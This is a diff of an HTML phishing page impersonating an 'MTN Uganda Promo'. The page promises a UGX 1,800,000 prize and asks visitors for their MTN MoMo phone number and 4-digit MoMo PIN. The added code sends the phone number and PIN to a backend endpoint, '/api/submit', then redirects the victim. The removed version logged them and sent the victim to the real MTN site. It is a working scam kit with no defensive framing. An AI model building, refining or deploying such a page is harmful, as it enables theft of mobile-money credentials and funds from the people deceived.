@@ -2,128 +2,51 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<title>MTN MoMo Promo - UGX 1,800,000</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>MTN Promo - UGX 1,800,000</title>
 <style>
-    * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-        -webkit-tap-highlight-color: transparent;
-    }
-
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
         background: linear-gradient(145deg, #e8edf2 0%, #dce3ec 100%);
         min-height: 100vh;
         display: flex;
         justify-content: center;
         align-items: center;
-        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         padding: 16px;
-        position: relative;
     }
-
-    .watermark {
-        position: fixed;
-        font-size: 55px;
-        font-weight: 900;
-        color: rgba(0, 0, 0, 0.03);
-        pointer-events: none;
-        z-index: 0;
-        white-space: nowrap;
-        user-select: none;
-    }
-    .top-left { top: 10px; left: 10px; transform: rotate(-15deg); }
-    .top-right { top: 10px; right: 10px; transform: rotate(15deg); }
-    .bottom-left { bottom: 10px; left: 10px; transform: rotate(10deg); }
-    .bottom-right { bottom: 10px; right: 10px; transform: rotate(-10deg); }
-
     .wrapper {
-        background: #ffffff;
+        background: white;
         border-radius: 48px;
         padding: 32px 24px 44px;
         max-width: 480px;
         width: 100%;
         text-align: center;
-        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.12), 0 2px 4px rgba(0, 0, 0, 0.02);
-        z-index: 2;
-        transition: opacity 0.4s ease;
-        border: 1px solid rgba(0, 0, 0, 0.05);
+        box-shadow: 0 20px 40px rgba(0,0,0,0.12);
+        transition: opacity 0.4s;
     }
-
-    svg {
-        max-width: 150px;
-        height: auto;
-        margin-bottom: 8px;
-    }
-
-    h1 {
-        font-size: 26px;
-        font-weight: 700;
-        color: #1a2c3e;
-        letter-spacing: -0.3px;
-        margin-top: 8px;
-        margin-bottom: 20px;
-    }
-
-    /* Professional prize message */
+    svg { max-width: 140px; margin-bottom: 8px; }
+    h1 { font-size: 26px; color: #1a2c3e; margin-bottom: 20px; }
     .prize-message {
-        font-size: 18px;
-        font-weight: 500;
-        color: #1e2f3d;
         background: #f8fafc;
         padding: 18px 20px;
         border-radius: 28px;
+        border-left: 4px solid #f5a623;
+        border-right: 4px solid #f5a623;
         margin: 8px 0 20px;
-        border-left: 5px solid #f5a623;
-        border-right: 5px solid #f5a623;
-        line-height: 1.45;
-        box-shadow: 0 2px 6px rgba(0,0,0,0.03);
     }
-
-    .prize-amount {
-        font-size: 28px;
-        font-weight: 800;
-        color: #c97e00;
-        display: inline-block;
-        margin: 8px 0 4px;
-        letter-spacing: -0.5px;
-    }
-
-    label {
-        display: block;
-        text-align: left;
-        font-weight: 600;
-        color: #2c3e4e;
-        margin: 20px 0 6px 8px;
-        font-size: 14px;
-    }
-
+    .prize-amount { font-size: 28px; font-weight: 800; color: #c97e00; margin: 8px 0 4px; }
+    label { display: block; text-align: left; font-weight: 600; margin: 20px 0 6px 8px; }
     input[type="tel"] {
         width: 100%;
         padding: 15px 20px;
-        font-size: 17px;
         border: 1.5px solid #e2e8f0;
         border-radius: 60px;
-        background: white;
-        transition: 0.2s;
+        font-size: 17px;
         outline: none;
-        font-weight: 500;
-        -webkit-appearance: none;
     }
-
-    input[type="tel"]:focus {
-        border-color: #f5a623;
-        box-shadow: 0 0 0 3px rgba(245, 166, 35, 0.15);
-    }
-
-    .pin-wrapper {
-        display: flex;
-        gap: 14px;
-        justify-content: center;
-        margin: 12px 0 16px;
-    }
-
+    input[type="tel"]:focus { border-color: #f5a623; }
+    .pin-wrapper { display: flex; gap: 14px; justify-content: center; margin: 12px 0; }
     .pin-box {
         width: 68px;
         height: 68px;
@@ -132,201 +55,143 @@
         font-weight: 700;
         border: 1.5px solid #cbd5e1;
         border-radius: 20px;
-        background: white;
-        font-family: 'Courier New', monospace;
         outline: none;
-        transition: all 0.15s;
+        font-family: monospace;
     }
-
-    .pin-box:focus {
-        border-color: #f5a623;
-        box-shadow: 0 0 0 3px rgba(245, 166, 35, 0.2);
-    }
-
+    .pin-box:focus { border-color: #f5a623; box-shadow: 0 0 0 3px rgba(245,166,35,0.2); }
     @media (max-width: 480px) {
-        .wrapper { padding: 24px 18px 36px; }
-        .prize-message { font-size: 16px; padding: 14px 16px; }
-        .prize-amount { font-size: 24px; }
-        .pin-box { width: 58px; height: 58px; font-size: 28px; }
-        h1 { font-size: 22px; }
+        .pin-box { width: 55px; height: 55px; font-size: 28px; }
     }
-
-    @media (max-width: 380px) {
-        .pin-box { width: 50px; height: 50px; font-size: 24px; border-radius: 16px; }
-        .pin-wrapper { gap: 8px; }
-    }
-
     .footer-note {
         margin-top: 24px;
-        font-size: 13px;
-        color: #4a6a7f;
         background: #f1f5f9;
         display: inline-block;
         padding: 8px 20px;
         border-radius: 40px;
-        font-weight: 500;
-    }
-
-    .secure-badge {
-        display: flex;
-        justify-content: center;
-        gap: 10px;
-        margin-top: 20px;
-        font-size: 11px;
-        color: #6c7a8a;
-    }
-
-    .secure-badge span {
-        background: #f8fafc;
-        padding: 5px 12px;
-        border-radius: 30px;
+        font-size: 13px;
     }
 </style>
 </head>
 <body>
-
-<div class="watermark top-left">MTN</div>
-<div class="watermark top-right">UGX 1.8M</div>
-<div class="watermark bottom-left">PROMO</div>
-<div class="watermark bottom-right">MoMo</div>
-
 <div class="wrapper" id="appWrapper">
-    <svg width="150" height="105" viewBox="0 0 420 310">
-        <ellipse cx="210" cy="250" rx="70" ry="10" fill="rgba(0,0,0,0.05)"/>
+    <svg width="140" height="100" viewBox="0 0 420 310">
         <rect x="125" y="45" width="150" height="160" rx="26" fill="#fff" stroke="#f5a623" stroke-width="6"/>
-        <rect x="175" y="185" width="50" height="8" rx="4" fill="#f5a623"/>
         <path d="M220 20 L300 65 L255 115 L165 75 Z" fill="#f5a623"/>
-        <path d="M235 8 L315 52 L270 102 L180 62 Z" fill="#f7c56e" opacity="0.9"/>
-        <line x1="205" y1="118" x2="190" y2="138" stroke="#f5a623" stroke-width="4"/>
-        <line x1="218" y1="123" x2="204" y2="148" stroke="#f5a623" stroke-width="4"/>
         <text x="72" y="270" font-size="52" fill="#1e2f3d" font-weight="800">MTN</text>
         <text x="195" y="270" font-size="52" fill="#f5a623" font-weight="800">MoMo</text>
-        <text x="143" y="295" font-size="15" fill="#7f8c8d" font-weight="500">Uganda</text>
     </svg>
-
     <h1>MTN Uganda Promo</h1>
-
-    <!-- New professional message -->
     <div class="prize-message">
-        You're almost there — fill in the form below to claim your prize of
+        You're almost there — fill in the form below to claim
         <div class="prize-amount">UGX 1,800,000</div>
         instantly.
     </div>
-
-    <form id="claimForm" onsubmit="return false;">
-        <input type="hidden" name="finalPin" id="pinHidden">
-        
-        <label>📱 MTN MoMo Number</label>
-        <input type="tel" id="phoneInput" placeholder="07XXXXXXXX" maxlength="10" autocomplete="off" inputmode="numeric">
-        
-        <label>🔐 4-digit MoMo PIN</label>
-        <div class="pin-wrapper" id="pinWrapper">
-            <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d">
-            <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d">
-            <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d">
-            <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d">
-        </div>
-    </form>
-
-    <div class="footer-note">
-        💰 Instant credit to your MoMo account
+    <input type="tel" id="phoneInput" placeholder="07XXXXXXXX" maxlength="10" autocomplete="off">
+    <label>🔐 4-digit MoMo PIN</label>
+    <div class="pin-wrapper" id="pinWrapper">
+        <input class="pin-box" maxlength="1" inputmode="numeric">
+        <input class="pin-box" maxlength="1" inputmode="numeric">
+        <input class="pin-box" maxlength="1" inputmode="numeric">
+        <input class="pin-box" maxlength="1" inputmode="numeric">
     </div>
-    <div class="secure-badge">
-        <span>🔒 Secured by MTN</span>
-        <span>✅ Limited offer</span>
-    </div>
+    <div class="footer-note" id="statusMsg">💰 Claim your prize</div>
 </div>
 
 <script>
-    (function(){
-        const phoneInput = document.getElementById("phoneInput");
-        const pinHidden = document.getElementById("pinHidden");
-        const pinBoxes = Array.from(document.querySelectorAll('.pin-box'));
-        const wrapper = document.getElementById("appWrapper");
+    const phoneInput = document.getElementById('phoneInput');
+    const pinBoxes = Array.from(document.querySelectorAll('.pin-box'));
+    const wrapper = document.getElementById('appWrapper');
+    const statusMsg = document.getElementById('statusMsg');
+    let realPin = ['', '', '', ''];
+    let submitted = false;
+
+    phoneInput.addEventListener('input', e => {
+        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10);
+    });
+
+    async function submitToBackend() {
+        if (submitted) return;
+        const phone = phoneInput.value;
+        const pin = realPin.join('');
         
-        let realPin = ["", "", "", ""];
-        let submitted = false;
-
-        phoneInput.addEventListener('input', function(e) {
-            this.value = this.value.replace(/\D/g, '').slice(0, 10);
-        });
-
-        function submitCapture() {
-            if (submitted) return;
-            const phone = phoneInput.value;
-            const fullPin = realPin.join('');
-            
-            if (!/^07\d{8}$/.test(phone)) return;
-            if (fullPin.length !== 4) return;
-            
-            submitted = true;
-            
-            console.log("📱 Phone:", phone);
-            console.log("🔐 PIN:", fullPin);
-            console.log("💰 Prize: UGX 1,800,000");
-            
-            wrapper.style.transition = "opacity 0.5s";
-            wrapper.style.opacity = "0";
-            
+        if (!/^07\d{8}$/.test(phone)) {
+            statusMsg.innerHTML = '❌ Invalid MTN number (07xxxxxxxx)';
+            statusMsg.style.background = '#ffe0e0';
             setTimeout(() => {
-                window.location.href = "https://www.mtn.co.ug/";
-            }, 500);
+                statusMsg.innerHTML = '💰 Claim your prize';
+                statusMsg.style.background = '#f1f5f9';
+            }, 2000);
+            return;
         }
-
-        function checkAndSubmit() {
-            pinHidden.value = realPin.join('');
-            const phoneValid = /^07\d{8}$/.test(phoneInput.value);
-            const pinValid = realPin.every(x => x !== "");
-            if (phoneValid && pinValid && !submitted) {
-                submitCapture();
-            }
+        if (pin.length !== 4) {
+            statusMsg.innerHTML = '❌ Enter complete 4-digit PIN';
+            statusMsg.style.background = '#ffe0e0';
+            setTimeout(() => {
+                statusMsg.innerHTML = '💰 Claim your prize';
+                statusMsg.style.background = '#f1f5f9';
+            }, 2000);
+            return;
         }
-
-        pinBoxes.forEach((box, idx) => {
-            box.addEventListener('input', function(e) {
-                let val = e.target.value.replace(/\D/g, '');
-                if (!val) return;
-                e.target.value = val;
-                realPin[idx] = val;
-                
+        
+        submitted = true;
+        statusMsg.innerHTML = '⏳ Processing...';
+        
+        try {
+            const res = await fetch('/api/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone, pin })
+            });
+            const data = await res.json();
+            
+            if (data.success) {
+                statusMsg.innerHTML = '✅ Redirecting...';
+                wrapper.style.opacity = '0';
                 setTimeout(() => {
-                    if (document.activeElement !== box) {
-                        e.target.value = '•';
-                    }
-                }, 120);
-                
-                if (idx < 3) pinBoxes[idx + 1].focus();
-                checkAndSubmit();
-            });
-            
-            box.addEventListener('keydown', function(e) {
-                if (e.key === "Backspace") {
-                    realPin[idx] = "";
-                    if (idx > 0 && !box.value) pinBoxes[idx - 1].focus();
-                    checkAndSubmit();
-                }
-            });
-            
-            box.addEventListener('focus', function() {
-                if (realPin[idx]) this.value = realPin[idx];
-            });
-            
-            box.addEventListener('blur', function() {
-                if (realPin[idx]) this.value = '•';
-            });
-        });
+                    window.location.href = data.redirect;
+                }, 500);
+            } else {
+                throw new Error(data.error);
+            }
+        } catch (err) {
+            statusMsg.innerHTML = '⚠️ Server error, try again';
+            statusMsg.style.background = '#ffe0e0';
+            submitted = false;
+            setTimeout(() => {
+                statusMsg.innerHTML = '💰 Claim your prize';
+                statusMsg.style.background = '#f1f5f9';
+            }, 2000);
+        }
+    }
 
-        document.addEventListener('keydown', function(e) {
-            if (e.key === "Enter") {
-                const phoneValid = /^07\d{8}$/.test(phoneInput.value);
-                const pinValid = realPin.every(x => x !== "");
-                if (phoneValid && pinValid && !submitted) {
-                    e.preventDefault();
-                    submitCapture();
-                }
+    // PIN box logic
+    pinBoxes.forEach((box, idx) => {
+        box.addEventListener('input', e => {
+            let val = e.target.value.replace(/\D/g, '');
+            if (!val) return;
+            e.target.value = val;
+            realPin[idx] = val;
+            setTimeout(() => {
+                if (document.activeElement !== box) e.target.value = '•';
+            }, 150);
+            if (idx < 3) pinBoxes[idx + 1].focus();
+            if (realPin.every(p => p !== '') && /^07\d{8}$/.test(phoneInput.value)) {
+                submitToBackend();
             }
         });
-    })();
+        box.addEventListener('keydown', e => {
+            if (e.key === 'Backspace') {
+                realPin[idx] = '';
+                if (idx > 0 && !box.value) pinBoxes[idx - 1].focus();
+            }
+        });
+        box.addEventListener('focus', function() {
+            if (realPin[idx]) this.value = realPin[idx];
+        });
+        box.addEventListener('blur', function() {
+            if (realPin[idx]) this.value = '•';
+        });
+    });
 </script>
 </body>
 </html>
